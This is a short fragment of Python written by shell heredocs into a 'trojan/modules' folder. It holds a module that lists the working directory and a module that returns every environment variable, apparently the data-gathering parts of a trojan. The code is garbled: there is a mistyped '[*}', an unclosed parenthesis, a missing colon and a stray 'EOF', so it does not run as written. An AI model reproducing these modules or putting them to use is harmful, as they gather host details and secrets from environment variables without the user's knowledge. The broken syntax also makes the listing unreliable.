import os
def run(**args):
print"[*} in dirlister module"
files=os.listdir("."
EOF	
cat <<EOF > trojan/modules/environment.py 
import os
def run(**args)
print "[*] in environment mode"
return str(os.environ)
